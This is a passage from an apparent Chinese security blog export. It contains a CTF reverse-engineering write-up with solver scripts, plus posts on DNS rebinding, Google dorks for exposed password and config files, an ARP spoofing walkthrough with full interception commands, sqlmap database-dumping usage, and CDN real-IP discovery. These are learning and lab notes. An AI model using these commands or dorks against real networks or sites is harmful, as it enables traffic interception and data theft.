~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255; return ~((~(_0x431cb1 + _0x516603) &amp; 255 | ~(_0x431cb1 + _0x516603) &amp; 255) &amp; 255) &amp; 255 &amp; 255;&#125;function sub(h_a, h_b, h_c) &#123; a = h_a + h_c + (((~h_b &amp; 255) + 1)&amp;255) + (((~h_c &amp; 255) + 1)&amp;255) a = h_a + h_c + 256-h_b + 256-h_c a = 512 + h_a - h_b // a = add(h_a, h_c); // a = add(a, add(~h_b &amp; 255, 1) &amp; 255); // a = add(a, add(~h_c &amp; 255, 1) &amp; 255); return a &amp; 255;&#125;function _G00D(userinput) &#123; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); var pass_err = document.getElementById(&quot;passwordError&quot;); userin = []; target = [85, 191, 99, 188, 51, 149, 49, 76, 137, 107, 73, 49, 48, 223, 99, 229, 87, 215, 115, 166, 110, 211, 99, 161, 146, 91, 114, 230, 143, 118, 79, 208]; Hur1k = &quot;Hur1k&quot;; if (userinput.length != 39) &#123; pass_err.textContent = &quot;错误的&quot;; return false; &#125; if (userinput.substr(0, 6) != &quot;XSCTF&#123;&quot;) &#123; pass_err.textContent = &quot;错误的&quot;; return false; &#125; if (userinput[38] != &quot;&#125;&quot;) &#123; pass_err.textContent = &quot;错误的&quot;; return false; &#125; in_slice = userinput.substr(6, 32); userinput = []; for (var i = 0; i &lt; in_slice.length; i++) &#123; userinput.push(in_slice.charCodeAt(i)); &#125; Math.seed = (new Date).getTime(); Math.seededRandom = function (p_a, p_b) &#123; p_b = p_b || 1; p_a = p_a || 0; Math.seed = (Math.seed * 9301 + 49297) % 233280; var p_seed = Math.seed / 233280; return parseInt(p_a + p_seed * (p_b - p_a)); &#125;; for (var i = 0; i &lt; userinput.length; i += 2) &#123; tmp = add(userinput[i], i) ^ i; userin.push(tmp); randNum = Math.seededRandom(0, 256); Math.seed = randNum; tmp = sub(tmp ^ userinput[i + 1], Hur1k.charCodeAt([i / 2 % Hur1k.length]), randNum); userin.push(tmp); &#125; (() =&gt; &#123; function _0x139d2b() &#123; setInterval(() =&gt; &#123; (function () &#123; return false; &#125;.constructor(&quot;debugger&quot;).call()); &#125;, 50); &#125; try &#123; _0x139d2b(); &#125; catch (_0x536807) &#123;&#125; &#125;)(); if (userin.length != 32) &#123; pass_err.textContent = &quot;究极错误的&quot;; return false; &#125; for (var i = 0; i &lt; userin.length; i++) &#123; if (userin[i] != target[i]) &#123; pass_err.textContent = &quot;错误的&quot;; return false; &#125; &#125; return true;&#125; exp.py 12345678910Hur1k = &quot;Hur1k&quot;s = [85, 191, 99, 188, 51, 149, 49, 76, 137, 107, 73, 49, 48, 223, 99, 229, 87, 215, 115, 166, 110, 211, 99, 161, 146, 91, 114, 230, 143, 118, 79, 208]charCode = [0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 0, 0]for i in range(30, -1, -2): s[i+1] = ((s[i+1]+ord(Hur1k[charCode[i]]))&amp;255)^s[i] s[i] = (s[i]^i)-ifor i in s: print(chr(i), end=&#x27;&#x27;) UR_R341Ly_900d_47_Obfu_ur_Newn3W 一些解混淆的网站 Obfuscator.io Deobfuscator (deobfuscate.io) JavaScript Deobfuscator (deobfuscate.io) 主页 - DeJs JavaScript Deobfuscator (relative.im) 工具 v_jstools（浏览器插件，需配置） – 网页 js 逆向分析 ( v_jstools )、jshook ( 安卓上用js实现Hook )-CSDN博客 lotery shop核心代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495void __noreturn sub_140017AC0()&#123; char *v0; // rdi __int64 i; // rcx char v2; // [rsp+60h] [rbp+0h] BYREF char v3[80]; // [rsp+68h] [rbp+8h] BYREF char v4[80]; // [rsp+B8h] [rbp+58h] BYREF char v5[96]; // [rsp+108h] [rbp+A8h] BYREF char v6[80]; // [rsp+168h] [rbp+108h] BYREF int v7[20]; // [rsp+1B8h] [rbp+158h] BYREF int v8[20]; // [rsp+208h] [rbp+1A8h] BYREF int v9[20]; // [rsp+258h] [rbp+1F8h] BYREF int v10[20]; // [rsp+2A8h] [rbp+248h] BYREF char v11[76]; // [rsp+2F8h] [rbp+298h] BYREF int v12[8]; // [rsp+344h] [rbp+2E4h] BYREF int v13[19]; // [rsp+364h] [rbp+304h] BYREF char v14[180]; // [rsp+3B0h] [rbp+350h] BYREF int v15[148]; // [rsp+464h] [rbp+404h] BYREF int v16; // [rsp+6B4h] [rbp+654h] v0 = &amp;v2; for ( i = 266i64; i; --i ) &#123; *(_DWORD *)v0 = -858993460; v0 += 4; &#125; sub_140011690(&amp;unk_14002D06A); v13[0] = 0; v13[8] = 10; j_memset(v14, 0, 30ui64); v15[0] = 0; sub_14001117C(v3, &quot;Sloth&#x27;s lottery shop is open!&quot;); sub_14001117C(v4, &quot;You&#x27;re our first customer!&quot;); sub_1400114CE(v5, &quot;We will give you a free lottery ticket, the number is: &quot;); sub_14001117C(v6, &quot;Please enter your choice &#123;1-5&#125;&quot;); sub_14001117C(v7, &quot;1.buy a lottery ticket&quot;); sub_14001117C(v8, &quot;2.Check to see if you won&quot;); sub_14001117C(v9, &quot;3.join us&quot;); sub_14001117C(v10, &quot;4.Take a sneak peek at the flag&quot;); sub_14001117C(v11, &quot;5.exit&quot;); sub_1400110FF( (int)v3, (int)v4, (int)v5, (int)v6, (__int64)v7, (__int64)v8, (__int64)v9, (__int64)v10, (__int64)v11, (__int64)v13, (__int64)v15, (__int64)v14); while ( 1 ) &#123; while ( 1 ) &#123; sub_14001156E((int)v7, (int)v8, (int)v9, (int)v10, v11, v6); sub_1400113CA(&quot;%d&quot;, v12); v16 = v12[0]; if ( v12[0] != 1 ) break; system(&quot;cls&quot;); sub_1400111EF(v15, (__int64)v14); sub_1400111BD(); &#125; switch ( v16 ) &#123; case 2: system(&quot;cls&quot;); sub_140011708(v15, v14, (unsigned int)v13[0]); sub_1400111BD(); break; case 3: system(&quot;cls&quot;); sub_14001149C(); sub_1400111BD(); break; case 4: system(&quot;cls&quot;); sub_1400114E7(); sub_1400111BD(); break; case 5: system(&quot;cls&quot;); puts(&quot;Welcome again&quot;); sub_1400111BD(); exit(1); default: puts(&quot;input error&quot;); sub_1400111BD(); break; &#125; &#125;&#125; 这里并没有有关flag的信息，真正的flag在sub_1400110FF函数中 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576__int64 __fastcall sub_140016760( __int64 a1, __int64 a2, __int64 a3, __int64 a4, _BYTE *a5, __int64 a6, __int64 a7, __int64 a8, _BYTE *a9, _DWORD *a10, int *a11, __int64 a12)&#123; unsigned int v12; // eax _BYTE *v14; // [rsp+1E8h] [rbp+1C8h] int v15; // [rsp+264h] [rbp+244h] int v16; // [rsp+264h] [rbp+244h] int i; // [rsp+284h] [rbp+264h] int v18; // [rsp+2A4h] [rbp+284h] int j; // [rsp+2C4h] [rbp+2A4h] __int64 v20; // [rsp+2E8h] [rbp+2C8h] sub_140011690(&amp;unk_14002D06A); v14 = (_BYTE *)sub_1400112AD(14i64); puts((const char *)a1); puts((const char *)a2); v14[9] = *a5; v14[2] = v14[9]; v14[1] = *(_BYTE *)(a1 + 10) - 12; v14[10] = *(_BYTE *)(a3 + 5) - 56; v14[7] = *(_BYTE *)(a6 + 15) - 10; v14[13] = toupper((char)(*(_BYTE *)(a8 + 3) + 3)); v14[3] = *(_BYTE *)(a2 + 1) + 4; v14[11] = toupper((char)(*(_BYTE *)(a7 + 7) - 14)); v14[4] = v14[7]; *v14 = tolower((char)(*a9 + 31)); v14[8] = toupper(*(char *)(a8 + 27)); v14[5] = toupper((char)(*(_BYTE *)(a4 + 13) - 16)); v14[6] = v14[3]; v14[12] = a5[6] - 39; v12 = sub_1400180A0(0i64); srand(v12); v15 = 1; for ( i = 0; i &lt; 8; ++i ) &#123; v18 = rand() % 10; if ( i != 7 || v18 ) &#123; *a10 += v18 * v15; v15 *= 10; &#125; else &#123; --i; &#125; &#125; v16 = 1; for ( j = 0; j &lt; 8; ++j ) &#123; v20 = rand() % 10; if ( j != 7 || v20 ) &#123; if ( j ) *(_QWORD *)(a12 + 8i64 * *a11) += v20 * v16; else *(_QWORD *)(a12 + 8i64 * *a11) = v20; v16 *= 10; &#125; else &#123; --j; &#125; &#125; return sub_1400112E9(&quot;%s %d\\n&quot;, (const char *)a3, *(_QWORD *)(a12 + 8i64 * (*a11)++));&#125; 真正的flag在v14变量中，是根据已有的变量变换得到的 exp 12345678910111213141516171819202122232425262728293031v3 = &quot;Sloth&#x27;s lottery shop is open!&quot;v4 = &quot;You&#x27;re our first customer!&quot;v5 = &quot;We will give you a free lottery ticket, the number is: &quot;v6 = &quot;Please enter your choice &#123;1-5&#125;&quot;v7 = &quot;1.buy a lottery ticket&quot;v8 = &quot;2.Check to see if you won&quot;v9 = &quot;3.join us&quot;v10 = &quot;4.Take a sneak peek at the flag&quot;v11 = &quot;5.exit&quot;v13 = [0, 0, 0, 0, 0, 0, 0, 0, 10]v15 = [0] * 10v14 = [0] * 10V14 = [0] * 14V14[9] = v7[0]V14[2] = V14[9]V14[1] = chr(ord(v3[10])-12)V14[10] = chr(ord(v5[5]) - 56)V14[7] = chr(ord(v8[15]) - 10)V14[13] = chr(ord(v10[3]) + 3).upper()#V14[3] = chr(ord(v4[1]) + 4)V14[11] = chr(ord(v9[7])-14).upper()#V14[4] = (V14[7])V14[0] = chr(ord(v11[0])+31).lower()#lV14[8] = (v10[27]).upper()#V14[5] = chr(ord(v6[13])-16).upper()#V14[6] = V14[3]V14[12] = chr(ord(v7[6])-39)print(&#x27;&#x27;.join(V14)) XSCTF&#123;th1s_Is_F14G:D&#125;","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"DNS重绑定","slug":"dns_rebinding_attack","date":"2022-04-17T09:09:58.753Z","updated":"2024-11-09T19:24:12.633Z","comments":true,"path":"2022/04/17/dns_rebinding_attack/","link":"","permalink":"http://uniqueland.top/2022/04/17/dns_rebinding_attack/","excerpt":"","text":"DNS重绑定DNS重绑定指的是在用户访问域名时更改域名指向的IP从而令用户访问指定IP的攻击手法 DNS：由于网络传输需要IP地址，故需要DNS（Domian Name Server）用于查询给定域名指向的IP 同源策略（The Same-origin Policy）： The same-origin policy restricts which network messages one origin can send to another. For example, the same-origin policy allows inter-origin HTTP requests with GET and POST methods but denies inter-origin PUT and DELETE requests. Additionally, origins can use custom HTTP headers when sending requests to themselves but cannot use custom headers when sending requests to other origins. The restrictions on reading information received from other origins is also somewhat subtle. For example, the HTML &lt;script&gt; element can execute content retrieved from foreign origins, which means web sites should not rely on the same-origin policy to protect the confidentiality of information in a format that happens to parse as script (e.g., JavaScript source files, JSON format, JSONP services, or JavaScript/gif polyglots). For all such resources, no loss of security would result (and much flexibility would be gained) from adding the Access-Control-Allow-Origin:* header to all responses. 以上解释来自于Same Origin Policy - Web Security (w3.org) 简单来说，为了防止淘宝网带着你的账户信息访问京东，需要同源策略来限制不同网站之间的访问规范 ​ 可以看出同源的要求是“协议+端口+域名/ip”，而如果以域名访问网站（通常的做法）时同源策略就变成了“协议+端口+域名”这就给了DNS重绑定攻击实现的可能 要实现DNS重绑定攻击，攻击者需要具备以下条件： 诱使用户点击给定链接（钓鱼邮件、钓鱼短信、社工等） 可控的DNS服务器（自己搭建一个或者抢一个） ​ DNS重绑定攻击会诱使用户访问一个域名，在用户第一次访问时以正常的IP进行通信，并且在返回的DNS查询结果中将TTL设置为1或其他比较小的数字，在诱使用户以点击等行为构造好恶意请求时，攻击者一般会修改DNS服务器上该域名指向的IP，从而将恶意请求发送至攻击者指定的IP； TTL（Time To Live）指的是dns查询结果的有效时间，通过修改TTL为一个较小的值从而实现受害者与DNS服务器的频繁通信，从而保证在修改域名指向的IP时能立即生效 ​ 易受攻击的设备：一般是位于内网的智能家居设备，由于攻击者无法从外网访问受害者的内网，故以此种攻击伪造身份访问内网（SSRF）；比如恒温器，若在一个只有老人的场所中，这种攻击往往是致命的 quoteSame Origin Policy - Web Security (w3.org)利用DNS重绑定攻击专用网络 - 知乎 (zhihu.com)从0到1认识DNS重绑定攻击 - 先知社区 (aliyun.com)","categories":[],"tags":[{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"}]},{"title":"GoogleHacking","slug":"google_hacking","date":"2022-04-09T09:12:54.823Z","updated":"2024-11-09T19:29:59.383Z","comments":true,"path":"2022/04/09/google_hacking/","link":"","permalink":"http://uniqueland.top/2022/04/09/google_hacking/","excerpt":"","text":"Google HackingGoogle hacking是一系列用于高效运用搜索引擎的技巧，也可以用于测试漏洞等用处 A and B 逻辑与，用于查找同时包含A和B的内容 A or B 逻辑或，用于查找包含A或包含B或同时包含A和B的内容 A -B 逻辑非，用于查找A但不包含B的内容 “xxx yyy” 完整匹配，用于查找带有完整xxx yyy的内容 site:xxx.com yyy 指定搜索范围，用于搜索特定范围（xxx.com）内有关yyy的内容 filetype:txt xxx 指定搜索文件类型，用于搜索有关xxx的txt文件 inurl:aaa 搜索匹配网址中带aaa的内容 allinurl: aaa bbb 与inurl相似，只不过可以指定多个关键词 intext:aaa xxx 搜索匹配网页正文中带aaa的且有关xxx的内容 intitle:xxx 搜索匹配网页的标题中包含xxx的内容 xxx* 使用通配符*搜索有关以xxx为前缀的内容 link:xxx.com 返回所有指向xxx.com的网页 related:xxx.com 返回所有与xxx.com相似的网页（指布局相似） cache:xxx.com [yyy] 返回搜索引擎有关xxx.com的缓存，如果加上关键词，则网页中的关键词会被高亮 info:www.xxx.com 返回有关站点www.xxx.com的相关信息 define:xxx 返回有关xxx的定义 Index of /xxx 返回允许当作目录访问的网页 一些技巧：查找网站后台site:xx.com intext:管理 site:xx.com inurl:login site:xx.com intitle:后台 查看服务器使用的程序site:xx.com filetype:asp site:xx.com filetype:php site:xx.com filetype:jsp site:xx.com filetype:aspx 查看上传漏洞site:xx.com inurl:file site:xx.com inurl:load 查看可访问目录index of /admin index of /passwd index of /password index of /mail “index of /“ +passwd “index of /“ +password.txt “index of /“ +.htaccess “index of /root” “index of /cgi-bin” “index of /logs” “index of /config” quoteGoogle-Hacking 语法笔记_Simon_Smith的博客-CSDN博客 2-信息收集—Google hacking_songly_的博客-CSDN博客 信息收集之Google Hacking的简单用法_谢公子的博客-CSDN博客_google hacking Google Hacking使用详解_Teacher.Hu的博客-CSDN博客_google hacking","categories":[],"tags":[{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"}]},{"title":"arp欺骗初次尝试","slug":"arp_cheat","date":"2022-04-03T12:21:02.410Z","updated":"2024-11-09T19:31:33.225Z","comments":true,"path":"2022/04/03/arp_cheat/","link":"","permalink":"http://uniqueland.top/2022/04/03/arp_cheat/","excerpt":"","text":"ARP欺骗是什么ARP欺骗（ARP spoofing），又称ARP毒化（ARP poisoning，网络上多译为ARP病毒）或ARP攻击，是针对以太网地址解析协议（ARP）的一种攻击技术，通过欺骗局域网内访问者PC的网关MAC地址，使访问者PC错以为攻击者更改后的MAC地址是网关的MAC，导致网络不通。此种攻击可让攻击者获取局域网上的数据包甚至可篡改数据包，且可让网络上特定计算机或所有计算机无法正常连线。 以上来自百度百科 个人理解大概原理就是在每台用于上网的机器中都会有一张叫arp缓存表的东西，里边记录了ip地址与mac地址（物理地址）的映射关系 这张表的形成过程如下： 假设现在我要与ip地址为192.168.1.2的主机通信，我就向局域网内的所有主机广播消息“谁是192.168.1.2 ？”，这时如果该ip的主机收到了广播，就会向发出广播的主机回应“192.168.1.2是我，我的mac地址是xxx”，然后发出广播的主机就将该ip和该mac地址记录到本机的arp缓存表中 而arp欺骗要做的，就是假装自己是某一台被请求的主机，把自己的mac地址与被假装主机的ip绑定起来记录在别人的arp缓存表中；由于网络的实际传输是通过mac地址进行寻址的，这样所有发送到被假装主机的信息都会通过mac地址发送到恶意主机上 具体过程设备：手机一台，电脑一台，树莓派一个 说明： 手机充当受害者（ip：192.168.137.116） 电脑充当网关（开热点 ip：192.168.137.1） 树莓派作为攻击机器（ip：192.168.137.66） 使用程序：arpspoof(需要安装dsniff与ssldump)，tcpdump，driftnet 为什么需要树莓派？ 本来打算用vmware模拟所有的主机的，但是由于局域网的配置问题无法用vmware模拟所有机器，模拟一部分的话又会因为局域网的问题导致虚拟机与物理机无法进行正常通信，所以就拿出了我吃灰多年的原生树莓派 首先使用nmap扫描受害者 确定了受害者的ip之后使用命令 arpspoof -i [网卡（此处为wlan0）] -t [目标ip] [网关ip] 进行欺骗 1sudo arpspoof -i wlan0 -t 192.168.137.116 192.168.137.1 如果仅仅只是想对目标主机进行断网操作的话无需其他操作，但是如果想进行双向的欺骗（中间人攻击），就必须打开树莓派的转发功能，命令如下： 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 然后再打开另一个窗口，安装driftnet 12sudo apt install driftnetsudo driftnet -i [监听网卡] -a -d [截取的图片的存放目录] 这样就可以获取受害者此时的图片了 如果用树莓派查看图片不方便，可以打开80端口，把图片放到网站根目录下再从浏览器访问 实际上在我进行实验时，截图获取得并不是很顺利，所以我选择了另外一种获取通信信息的方式——tcpdump 在arpspoof命令运行的时候，由于受害者与网关的所有通信都会经过攻击机的网卡，故我们可以用tcpdump来获取本地网卡接收到的信息。命令如下： 1sudo tcpdump -i wlan0 -s 0 -w e.cap wlan0是网卡，e.cap是抓包存放的文件名称，回车之后便开始抓包，等到什么时候觉得差不多了就crtl+C停止就行，此时在当前目录下应该会出现刚刚抓包的文件（此处为e.cap），可以使用以下命令读取： 1sudo tcpdump -A -r e.cap -A是以ascii形式显示 -r后面的是要打开的文件，除了这种打开方式，还有类似过滤器的功能 1sudo tcpdump -n dst host 119.91.135.95 -r e.cap 该命令过滤了ip为119.91.135.95的通信信息并显示在屏幕上 以上是传输过程中截取的信息 quoteARP欺骗_百度百科 (baidu.com) kaili linux使用arpspoof进行arp欺骗 - 闻所未闻 - 博客园 (cnblogs.com) ARP–利用arpspoof和driftnet工具进行arp欺骗_mr_xiuk的博客-CSDN博客_arpspoof kali linux操作系统中TCPDUMP详细使用方法_隔壁老湿的技术博客_51CTO博客 Kali渗透-ARP断网攻击与监听_Tr0e的博客-CSDN博客_kali局域网渗透监控 kali linux下的arp攻击 - 逗比大师 - 博客园 (cnblogs.com)","categories":[],"tags":[{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"}]},{"title":"Sqlmap基本操作","slug":"sqlmap","date":"2022-03-29T02:24:19.004Z","updated":"2024-11-09T19:31:57.605Z","comments":true,"path":"2022/03/29/sqlmap/","link":"","permalink":"http://uniqueland.top/2022/03/29/sqlmap/","excerpt":"","text":"安装Linux / Mac OS1git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev Windows安装git-bash之后在选定目录下右键打开git-bash窗口运行上述命令即可 下载地址： https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe 常用命令1234567python sqlmap.py -h # 获取常见选项python sqlmap.py -hh # 获取所有选项python sqlmap.py -u www.example.com # 检测GET注入python sqlmap.py -u www.example.com --batch # 使用默认选项（不用手动选择y/n）python sqlmap.py -u www.example.com --batch --dbs --tables --columns # 返回数据库/表/列python sqlmap.py -u www.example.com --batch -D xxx -T xxx -C xxx # 指定数据库/表/列python sqlmap.py -u www.example.com --batch --dump # 直接返回数据库内容 注：如果是在Linux系统下，python命令可能调用的是python2，如果报错可将python换为python3 ​ 如果有其他报错，尝试将网址等参数用双引号包裹 ​ Windows下可在命令提示符或powershell下运行 在返回数据库/表/列时，可只指定一项 在指定数据库/表/列时，也可只指定一项 一般将dump选项和上述命令结合，直接返回注入结果 更多玩法12345678910python sqlmap.py -m 1.txt # 从文件中导入urlpython sqlmap.py -r res.txt # 从文件中导入http响应python sqlmap.py -l burp.txt # 从文件中导入burp抓包文件python sqlmap.py -u www.example.com --data=&quot;id=1&quot; # 使用POST注入python sqlmap.py -u www.example.com --level 2 # 使用2级注入，检测cookie注入python sqlmap.py -u www.example.com --level 3 # 使用3级注入，检测referer注入和USER-AGENT注入python sqlmap.py -u www.example.com --level 5 # 使用5级注入，检测host注入python sqlmap.py -u www.example.com --random-agent # 使用随机代理python sqlmap.py -u www.example.com --tor # 使用匿名tor网络python sqlmap.py -u www.example.com --hpp # 检测http污染 level默认为1，范围为 1 - 5 更多用法和命令可参照官网文档：http://sqlmap.org/ quoteGitHub - sqlmapproject/sqlmap: Automatic SQL injection and database takeover tool sqlmap详细使用教程_星落.的博客-CSDN博客_sqlmap 超详细SQLMap使用攻略及技巧分享 - FreeBuf网络安全行业门户","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"}]},{"title":"有关BT种子的一些事","slug":"bit_torrent","date":"2022-03-27T11:51:10.696Z","updated":"2024-11-09T19:33:03.709Z","comments":true,"path":"2022/03/27/bit_torrent/","link":"","permalink":"http://uniqueland.top/2022/03/27/bit_torrent/","excerpt":"","text":"Bit Torrent (BT种子)是什么？ BitTorrent(简称BT)是一个文件分发协议，每个下载者在下载的同时不断向其他下载者上传已下载的数据。而在FTP,HTTP协议中，每个下载者在下载自己所需文件的同时，各个下载者之间没有交互。当非常多的用户同时访问和下载服务器上的文件时，由于FTP服务器处理能力和带宽的限制，下载速度会急剧下降，有的用户可能访问不了服务器。BT协议与FTP协议不同，特点是下载的人越多，下载速度越快，原因在于每个下载者将已下载的数据提供给其他下载者下载，充分利用了用户的上载带宽。通过一定的策略保证上传速度越快，下载速度也越快。在很短时间内，BitTorrent协议成为一种新的变革技术。 以上说明来自百度百科 用通俗的话讲，BT种子（以下简称 种子 ）技术其实就是将一个比较大的文件（比如电影或镜像）按照一定的规范分成多个块，当用户通过.torrent文件下载时，会连接上种子文件中记录的tracker服务器，而tracker服务器并不提供文件本身，而是通过查询返回当前同在下载该文件的其他客户端的地址，而主机接收到该地址后，会逐个逐个尝试连接，连接成功的便通过点对点（P2P）的方式获取对方计算机上的另一部分文件，然后再连接其他的客户端，获取文件的其他部分 Bit Torrent 与其他下载方式相比，有什么优势？不同于传统的 C/S ( Client / Server )模式，P2P的下载方式避免了单个服务器提供多个客户端的服务时带宽负载大的问题；在P2P下载时，每一台计算机，既是客户端，又是服务端，在下载的过程中，也向其他有需要的客户端上传自己的文件，有效节省了带宽； 另外，由于P2P去中心化的特点，每个处于BT网络中的文件，其存在与否不再取决于文件的提供者或服务商，在一定程度上避免了文件因个人过失而永久消失的情况 Bit Torrent 与其他下载方式相比，有什么劣势？有优势就肯定有劣势，如上文所说，BT下载是通过同在下载该文件的其他客户端提供的服务来获取文件的，那么，当同时在下载该文件的客户端很少，甚至我们可以假设一种极端情况：整个网络就只有你一台计算机在下载该文件，那么你将不会得到你想要的文件，因为没有其他节点给你提供你想要的文件 另一方面，同样由于BT技术中文件无法轻易清除的特点，文件一旦上传，想永久抹去的可能性不大，那么万一有不法分子上传了本不该出现在网络上的文件（比如有关国家机密或者个人隐私，有或者未上映的电影之类的），其后果不堪设想 torrent文件都记录了什么？A）这个文件（文件夹）中数据的SHA1值，比如一个1G的文件，如果按1M每块进行分块，则会被分为了1000块，torrent中就会有这1000个数据块的指纹值（SHA1的hash值），这个占据了torrent文件的绝大部分空间。这些值的目的是为了下载的过程中进行数据校验，确保数据收到的和当时源头制作torrent时的源文件100%一致，防止恶意数据攻击。 B）一般制作torrent文件时，还会要指定一个或者多个Tracker的地址，比如http://www.a.com:8080/announce这种地址。torrent里面一般也会存储了这个信息，这个其实也尤为重要。相当于记录了一个问询服务器的地址，这个问询服务器的作用，后面我再解释。 C）文件或者文件夹内每个文件的名字，方便下载文件时，磁盘上直接命名好跟原始数据一样的目录结构、文件名。 D）其它一些辅助和可扩展的信息，比如可以配置一个P2SP的http地址辅助下载，比如制作软件的名字、备注……。 E）上面信息生成后，torrent会把A）里面的这些信息，以及torrent里面的文件名等关键信息，再进行一次Hash，生成一个新的SHA1值，作为torrent的HASH值，也就是我们经常看到的下载软件里面对这个种子命名的一个唯一的hash值，也有的在magnet这种磁力链接中可以看到这个值，这就是torrent的唯一标记。 以上就是.torrent文件的内容，可以用记事本打开，但可能看到乱码。这个文件的编码遵循了bencode编码规则。但实际内容就主要是上面这些。所以，torrent可以理解为对原始数据的一些记录。 如果下载时没有其他节点在线。又没有http服务器，是不是就不能进行下载了呢？不一定，BT发明者提出了DHT（Distributed Hash Table）的概念，就算Tracker连不上了，也可以通过分布式哈希表DHT技术，通过DHT网络慢慢的寻找志同道合的邻居节点，只是没有Tracker那么直接那么快速，但慢一些总还是有机会找到邻居的 有关下载过程中的一些事文件下载时，若存在提供下载服务的http服务器，那么就算没有其他的客户端在线，下载仍然可以进行 下载过程中出现卡在99.99%的原因是因为当所有分块都下载完毕时，电脑会对下载的文件进行文件校验（类似于哈希检验），而当文件校验不通过时，电脑就会对组成文件的所有分块逐个逐个进行检验，发现校验值不对的文件分块再重新下载，这就是为什么有时候下载卡住的原因 当文件下载完毕时，如果你没有关闭下载文件的客户端，那么如果有其他人需要你的文件，即使你没有在下载文件，你所拥有的文件分块依然可以上传给其他客户端，成为一名崇高的传递者 文件下载时，影响下载速度的，除了你的电脑当前的网速，其实还有你的电脑当前的上传速度；在BT网络的带宽分配中，上传速度快的客户端能够获得的下载速度会相对比较快 某些运营商会对BT下载时的通信进行拦截，它们会对通信过程中传输的内容进行分析，由于早期的下载传输的是明文，故很容易就能够被运营商截取；当然，道高一尺，魔高一丈，如今的下载过程传输的内容大部分都进行过加密 quoteBitTorrent_百度百科 (baidu.com) https://www.zhihu.com/question/49829233/answer/160765176","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"有关cdn和真实ip的一些事","slug":"cdn","date":"2022-03-20T06:21:18.883Z","updated":"2024-11-09T19:33:26.863Z","comments":true,"path":"2022/03/20/cdn/","link":"","permalink":"http://uniqueland.top/2022/03/20/cdn/","excerpt":"","text":"CDN是什么？ CDN(Content Delivery Network)是指内容分发网络，也称为内容传送网络，这个概念始于1996年，是美国麻省理工学院的一个研究小组为改善互联网的服务质量而提出的。为了能在传统IP网上发布丰富的宽带媒体内容，他们提出在现有互联网基础上建立一个内容分发平台专门为网站提供服务，并于1999年成立了专门的CDN服务公司，为Yahoo提供专业服务。由于CDN是为加快网络访问速度而被优化的网络覆盖层，因此被形象地称为“网络加速器”。 以上是来自百度百科的解释个人理解，通俗点说，cdn其实就是一些服务器，将你的一些静态文件（html）什么的复制一份，然后等有人访问网站的时候再就近选择cdn服务器把你的那些静态页面返回，这样就不用通过你的服务器，从而减轻带宽负载了 CDN和IP是什么关系？由于用户获取静态文件时大概率会由CDN服务器返回，则大多数情况下用户输入域名访问网站时，实际进行通信的很可能不是该网站真实的IP，而是CDN服务器的IP CDN的好处有哪些？最明显的也是大部分人最需要的，就是减少自家服务器的带宽负载此外还有一个好处，就是隐藏服务器的真实IP（但是不能百分百隐藏） CDN隐藏IP的好处是什么？为什么不能完全隐藏？隐藏IP最大的好处就是在一定程度上避免自家服务器受到攻击（DDoS攻击之类的），因为不法分子无法知道我们服务器的真实IP，也就无法对该IP进行大量重复的请求从而达到使网站拒绝服务的效果，最多就是把最近的CDN服务器打了下来那天下CDN千千万，你把这个打下来了又有什么用呢？你又不能确保你下一个访问的服务器一定不是CDN 我怎么知道自己的请求是不是到了CDN呢？想知道自己访问的服务器是不是CDN，有几种办法：windows命令行用nslookup命令查询一下目标域名，如果一个域名对应着好几个IP，那十有八九是使用了CDN；当然，如果只返回了一个IP也不能说明目标网站就没有使用CDN在CDN查询网站上查 http://ping.chinaz.com/http://ping.aizhan.com/http://ce.cloud.360.cn/ 查子域名：因为大部分站长使用CDN针对的大多是首页等访问量比较大的页面，那么子页面就有可能没有使用CDN，这时候查询子页面返回的结果很有可能就是真实IP漏洞利用：用CTF那套试试。不过不提倡且大部分情况下不合法分析服务器返回的信息：有些网站会有邮件服务或者订阅服务之类的，而这些服务有时并不会使用CDN，通过分析邮件源码就可以得到IP通过国外访问：有些CDN只面向国内的请求，对于不在服务范围的国外请求有可能不会经过CDN而直接访问真实IP直接访问CDN服务器：最直接的方法就是拿到CDN服务器的账户自己上去查 怎样才能有CDN服务？除了花钱买这一最直接的方法之外，还有另外一种能够获得CDN服务的方法，就是在租赁域名的时候很多服务提供商会免费对该域名提供CDN服务，不要白不要 以下是对我自己网站的CDN查询 最后再说一句，拿到真实IP了也未必能够通过IP访问目标网站 quotehttps://blog.csdn.net/fly_hps/article/details/98486807https://www.cxybb.com/article/weixin_37104668/115167764https://baike.baidu.com/item/CDN/420951","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"}]},{"title":"curl的常见用法","slug":"curl","date":"2022-03-12T12:22:27.696Z","updated":"2022-03-12T12:52:54.139Z","comments":true,"path":"2022/03/12/curl/","link":"","permalink":"http://uniqueland.top/2022/03/12/curl/","excerpt":"curl用法：","text":"curl用法： 123456789101112131415161718192021222324252627282930313233343536373839GET请求：curl https://www.xxx.comPOST请求：curl -d key=value https://www.xxx.com填写表单：curl -F key1=value1 -F key2=value2 https://www.xxx.com/xxx.cgi显示信息：curl -i https://www.xxx.com指定USER-AGENTcurl -A 